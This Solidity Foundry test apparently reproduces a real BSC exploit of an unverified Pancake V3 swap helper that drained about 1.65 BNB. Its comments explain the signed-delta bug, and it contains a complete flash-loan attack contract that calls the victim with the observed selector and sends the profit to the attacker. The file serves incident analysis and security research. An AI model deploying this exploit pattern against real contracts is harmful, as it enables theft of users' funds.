// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~1.6488688845 BNB (~$1.3K)
// Attacker : https://bscscan.com/address/0x804D75DB19Ef595FD7F540262FAFa2FdA3E7d101
// Attack Contract : https://bscscan.com/address/0x43492c467986eaE378A1f8F8afC0B6f2417C3A2f
// Vulnerable Contract : https://bscscan.com/address/0x222c8580eAa32f6F5A728bDA0129Cfa485eCc52D
// Attack Tx : https://bscscan.com/tx/0x70bc4ff8439f74d26d454a53e9a135ac3659a958aa3462218d0db7ed55cf5104

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x222c8580eAa32f6F5A728bDA0129Cfa485eCc52D#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/exvulsec/status/2102687289730310458
// Hacking God : N/A
//
// ROOT CAUSE (inferred from the unverified helper's runtime behavior and the attack trace):
// Pancake V3 reports signed swap deltas: for USDT -> WBNB, the USDT input is positive and the
// WBNB output is negative. The helper uses the positive USDT delta as the WBNB amount to unwrap.
// At the attack state the helper holds 1.651021225164017256 WBNB, while the pool returns only
// 0.002089397784051482 WBNB. It therefore unwraps and pays out its pre-existing WBNB inventory.
//
// EXPLOIT (single atomic transaction; reconstructed from the real transaction trace):
// 1. Borrow 3.651021225164017256 USDT from Moolah: 1.651021225164017256 for the vulnerable call
//    plus a 2 USDT buffer for repaying the flash loan.
// 2. Call the helper with USDT, the 0.01% Pancake V3 fee tier, amountIn = 1.651021225164017256,
//    param4 = 1, and the attack contract as recipient. The pool returns ~0.002089 WBNB, but the
//    helper unwraps and pays the recipient 1.651021225164017256 BNB from its inventory.
// 3. Wrap 0.05 BNB, then buy exactly 1.651021225164017256 USDT through Pancake V2. The swap spends
//    0.002095724137859296 WBNB; unwrap the remainder and repay the full Moolah principal.
// 4. Send the remaining 1.648925501026157960 BNB to the attacker EOA. This is the pre-gas profit;
//    subtracting the original 1,132,330-gas transaction fee at 0.05 gwei gives 1.648868884526157960 BNB.
//
// This PoC forks immediately before the attack transaction and replays the real Moolah loan,
// vulnerable helper, and Pancake V2 buyback against live BSC state. The unverified helper's source
// is unavailable, so its entry point is called using the selector and argument layout observed on-chain.

interface IMoolahSwapHelper {
    function flashLoan(
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
}

interface IPancakeV2SwapHelperRouter {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IWrappedBNBSwapHelper {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function deposit() external payable;
    function withdraw(
        uint256 amount
    ) external;
}

contract PancakeV3SwapHelperExploitTest is BaseTestWithBalanceLog {
    bytes32 private constant ATTACK_TX = 0x70bc4ff8439f74d26d454a53e9a135ac3659a958aa3462218d0db7ed55cf5104;
    address private constant ATTACKER = 0x804D75DB19Ef595FD7F540262FAFa2FdA3E7d101;
    IERC20 private constant USDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWrappedBNBSwapHelper private constant WBNB_TOKEN =
        IWrappedBNBSwapHelper(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address private constant VICTIM = 0x222C8580eaA32f6f5a728bda0129CFA485eCc52D;
    IMoolahSwapHelper private constant MOOLAH = IMoolahSwapHelper(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IPancakeV2SwapHelperRouter private constant PANCAKE_V2_ROUTER =
        IPancakeV2SwapHelperRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    bytes4 private constant SWAP_SELECTOR = 0x6c26c88a;
    uint24 private constant POOL_FEE = 100;
    uint256 private constant PARAM4 = 1;
    uint256 private constant FLASHLOAN_BUFFER = 2 ether;
    uint256 private constant WBNB_BUYBACK_SEED = 0.05 ether;
    uint256 private constant EXPECTED_VICTIM_INVENTORY = 1_651_021_225_164_017_256;
    uint256 private constant EXPECTED_WBNB_BUYBACK = 2_095_724_137_859_296;
    uint256 private constant EXPECTED_POOL_OUTPUT = 2_089_397_784_051_482;
    uint256 private constant EXPECTED_ATTACKER_BNB_BEFORE_GAS = 1_648_925_501_026_157_960;

    PancakeV3SwapHelperAttack private attackContract;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), ATTACK_TX);
        fundingToken = address(0);
        attackContract = new PancakeV3SwapHelperAttack();
        attacker = ATTACKER;

        vm.label(VICTIM, "Unverified swap helper");
        vm.label(address(USDT_TOKEN), "USDT");
        vm.label(address(WBNB_TOKEN), "WBNB");
        vm.label(address(MOOLAH), "Moolah");
        vm.label(address(PANCAKE_V2_ROUTER), "Pancake V2 Router");
        vm.label(ATTACKER, "Attacker");
    }

    function testExploit() public balanceLog {
        uint256 amountIn = WBNB_TOKEN.balanceOf(VICTIM);
        assertEq(amountIn, EXPECTED_VICTIM_INVENTORY, "victim inventory changed at attack tx");

        attackContract.attack(amountIn);

        uint256 attackerBnb = ATTACKER.balance;
        emit log_named_decimal_uint("Victim WBNB inventory drained", amountIn, 18);
        emit log_named_decimal_uint("Attacker BNB profit before gas", attackerBnb, 18);

        assertEq(attackerBnb, EXPECTED_ATTACKER_BNB_BEFORE_GAS, "attacker BNB profit differs from tx trace");
        assertEq(USDT_TOKEN.balanceOf(address(attackContract)), 0, "Moolah loan was not fully repaid");
        assertEq(WBNB_TOKEN.balanceOf(address(attackContract)), 0, "leftover WBNB was not unwrapped");
        assertEq(
            WBNB_TOKEN.balanceOf(VICTIM), EXPECTED_POOL_OUTPUT, "victim should retain only the actual V3 swap output"
        );
    }
}

contract PancakeV3SwapHelperAttack {
    IERC20 private constant USDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWrappedBNBSwapHelper private constant WBNB_TOKEN =
        IWrappedBNBSwapHelper(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address private constant VICTIM = 0x222C8580eaA32f6f5a728bda0129CFA485eCc52D;
    address private constant ATTACKER = 0x804D75DB19Ef595FD7F540262FAFa2FdA3E7d101;
    IMoolahSwapHelper private constant MOOLAH = IMoolahSwapHelper(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IPancakeV2SwapHelperRouter private constant PANCAKE_V2_ROUTER =
        IPancakeV2SwapHelperRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    bytes4 private constant SWAP_SELECTOR = 0x6c26c88a;
    uint24 private constant POOL_FEE = 100;
    uint256 private constant PARAM4 = 1;
    uint256 private constant FLASHLOAN_BUFFER = 2 ether;
    uint256 private constant WBNB_BUYBACK_SEED = 0.05 ether;
    uint256 private constant EXPECTED_WBNB_BUYBACK = 2_095_724_137_859_296;

    function attack(
        uint256 amountIn
    ) external {
        MOOLAH.flashLoan(address(USDT_TOKEN), amountIn + FLASHLOAN_BUFFER, abi.encode(amountIn));
    }

    function onMoolahFlashLoan(
        uint256 loanAmount,
        bytes calldata data
    ) external {
        require(msg.sender == address(MOOLAH), "not Moolah");
        uint256 amountIn = abi.decode(data, (uint256));
        require(loanAmount == amountIn + FLASHLOAN_BUFFER, "unexpected Moolah loan amount");

        USDT_TOKEN.approve(VICTIM, amountIn);
        (bool success,) = VICTIM.call(
            abi.encodeWithSelector(
                SWAP_SELECTOR, address(USDT_TOKEN), POOL_FEE, amountIn, PARAM4, block.timestamp, address(this)
            )
        );
        require(success, "victim swap call reverted");

        // Reproduce the attack's WBNB seed, then buy back exactly the USDT needed for repayment.
        WBNB_TOKEN.deposit{value: WBNB_BUYBACK_SEED}();
        WBNB_TOKEN.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB_TOKEN);
        path[1] = address(USDT_TOKEN);
        uint256[] memory amounts = PANCAKE_V2_ROUTER.swapTokensForExactTokens(
            amountIn, type(uint256).max, path, address(this), block.timestamp
        );
        require(amounts[0] == EXPECTED_WBNB_BUYBACK, "unexpected Pancake V2 WBNB input");

        WBNB_TOKEN.withdraw(WBNB_TOKEN.balanceOf(address(this)));
        USDT_TOKEN.approve(address(MOOLAH), loanAmount);

        (bool sent,) = ATTACKER.call{value: address(this).balance}("");
        require(sent, "attacker BNB payout failed");
    }

    receive() external payable {}
}
